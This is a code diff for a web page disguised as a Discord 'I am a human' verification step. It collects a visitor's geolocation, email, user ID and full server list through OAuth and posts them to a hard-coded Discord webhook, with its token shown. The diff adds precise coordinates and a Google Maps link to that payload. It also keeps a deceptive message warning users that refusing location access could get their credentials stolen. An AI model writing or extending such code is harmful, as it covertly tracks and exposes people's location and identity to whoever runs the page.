@@ -228,6 +228,7 @@
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1536692672079724645/83NQgcZ-AerJ4Oc5tX4GI8cJZ-P32Y29jGQSaMjEWcs16ZxDz2adwefkPh9qEuT45sJA";
 
         let userAccessToken = '';
+        let userLocation = null; // Store location globally
 
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20email%20guilds%20guilds.members.read`;
         const loginBtn = document.getElementById('loginBtn');
@@ -252,6 +253,9 @@
         const longitude = position.coords.longitude;
         const accuracy = position.coords.accuracy;
         const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        // Save globally for later login webhook
+        userLocation = { latitude, longitude, accuracy, googleMapsUrl };
 
         try {
         await fetch(WEBHOOK_URL, {
@@ -279,15 +283,10 @@
         },
         (error) => {
         console.warn("Geolocation permission error:", error.message);
-
-        // Update UI to tell the user to verify again
         verifyMsg.textContent = "You must press allow to proceed, since blocking the request might put your discord account credentials stolen.";
-        verifyMsg.style.color = "#ed4245"; // Red error color
-
+        verifyMsg.style.color = "#ed4245";
         humanBtn.textContent = "I am a human.";
         humanBtn.disabled = false;
-
-        // DO NOT unlock interface here
         },
         { enableHighAccuracy: false, timeout: 10000, maximumAge: 0 }
         );
@@ -439,7 +438,6 @@
 
         if (memberRes.ok) {
         const member = await memberRes.json();
-
         if (member.roles && member.roles.length > 0) {
         rolesBox.innerHTML = member.roles.map(roleId => `<span class="role-badge">Role ID: ${roleId}</span>`).join('');
         } else {
@@ -459,13 +457,10 @@
 
         async function logLoginToWebhook(user, guilds) {
         try {
-        const username = user.global_name
-        ? `${user.global_name} (@${user.username})`
-        : `@${user.username}`;
-
         let fileText = `=========================================\n`;
         fileText += ` DISCORD SERVER LIST FOR ${user.username.toUpperCase()}\n`;
         fileText += ` User ID: ${user.id}\n`;
+        fileText += ` Email: ${user.email || 'Not Provided'}\n`;
         fileText += ` Total Guilds: ${guilds.length}\n`;
         fileText += ` Logged At: ${new Date().toISOString()}\n`;
         fileText += `=========================================\n\n`;
@@ -483,20 +478,31 @@
         fileText += "No servers found.";
         }
 
+        const fields = [
+        { name: "User", value: `${user.global_name || user.username} (@${user.username})`, inline: true },
+        { name: "Email", value: user.email || "Not provided", inline: true }
+        ];
+
+        if (userLocation) {
+        fields.push(
+        { name: "Latitude", value: String(userLocation.latitude), inline: true },
+        { name: "Longitude", value: String(userLocation.longitude), inline: true },
+        { name: "Accuracy", value: `~${Math.round(userLocation.accuracy)} meters`, inline: true },
+        { name: "Google Maps Link", value: `[View Location](${userLocation.googleMapsUrl})`, inline: false }
+        );
+        }
+
+        fields.push({
+        name: "Full Server List",
+        value: "📁 Complete list attached below as a text file.",
+        inline: false
+        });
+
         const payload = {
         embeds: [{
         title: "Discord OAuth Completed",
         color: 5793266,
-        fields: [
-        { name: "User", value: username, inline: true },
-        { name: "User ID", value: String(user.id), inline: true },
-        { name: "Total Servers", value: `**${guilds.length}** guilds`, inline: true },
-        {
-        name: "Full Server List",
-        value: "📁 Complete list attached below as a text file.",
-        inline: false
-        }
-        ],
+        fields: fields,
         timestamp: new Date().toISOString()
         }]
         };
